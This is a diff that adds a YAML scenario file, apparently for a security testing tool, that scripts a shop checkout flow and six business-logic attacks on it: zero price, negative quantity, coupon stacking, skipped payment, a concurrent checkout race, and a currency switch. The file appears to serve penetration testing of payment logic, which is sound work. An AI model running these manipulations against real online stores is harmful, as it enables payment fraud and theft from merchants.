@@ -1,0 +1,124 @@
+name: payment_bypass
+description: Payment and checkout flow business logic attacks
+
+variables:
+  product_id: "1"
+  quantity: 1
+  initial_price: 100
+
+steps:
+  - name: add_to_cart
+    request:
+      method: POST
+      url: /api/cart/add
+      json:
+        product_id: "${product_id}"
+        quantity: ${quantity}
+    extract:
+      cart_id: $.cart_id
+      item_id: $.item_id
+    expect:
+      status: [200, 201]
+
+  - name: apply_coupon
+    request:
+      method: POST
+      url: /api/cart/${cart_id}/coupon
+      json:
+        code: "DISCOUNT10"
+    extract:
+      discount_amount: $.discount
+      final_price: $.total
+    optional: true
+
+  - name: checkout
+    request:
+      method: POST
+      url: /api/checkout
+      json:
+        cart_id: "${cart_id}"
+        payment_method: "credit_card"
+    extract:
+      order_id: $.order_id
+      payment_url: $.payment_url
+    expect:
+      status: 200
+
+  - name: complete_payment
+    request:
+      method: POST
+      url: /api/payment/complete
+      json:
+        order_id: "${order_id}"
+        transaction_id: "txn_test_123"
+    expect:
+      status: 200
+      body_contains: "success"
+
+attacks:
+  - name: zero_price_attack
+    description: Modify cart item price to zero
+    type: price_manipulation
+    modify_step: add_to_cart
+    modifications:
+      json.price: 0
+      json.unit_price: 0
+    verify:
+      - request:
+          method: GET
+          url: /api/orders/${order_id}
+        expect:
+          json_path:
+            $.total: 0
+
+  - name: negative_quantity
+    description: Use negative quantity for refund
+    type: quantity_manipulation
+    modify_step: add_to_cart
+    modifications:
+      json.quantity: -1
+
+  - name: coupon_stacking
+    description: Apply multiple coupons
+    type: coupon_abuse
+    sequence:
+      - request:
+          method: POST
+          url: /api/cart/${cart_id}/coupon
+          json:
+            code: "DISCOUNT10"
+      - request:
+          method: POST
+          url: /api/cart/${cart_id}/coupon
+          json:
+            code: "DISCOUNT20"
+      - request:
+          method: POST
+          url: /api/cart/${cart_id}/coupon
+          json:
+            code: "FREESHIP"
+
+  - name: skip_payment
+    description: Skip payment step entirely
+    type: payment_bypass
+    skip_steps:
+      - complete_payment
+    verify:
+      - request:
+          method: GET
+          url: /api/orders/${order_id}
+        expect:
+          body_contains: "completed"
+
+  - name: race_checkout
+    description: Race condition in checkout
+    type: race_condition
+    concurrent: 10
+    modify_step: checkout
+
+  - name: currency_manipulation
+    description: Change currency to cheaper one
+    type: currency_bypass
+    modify_step: checkout
+    modifications:
+      json.currency: "IDR"
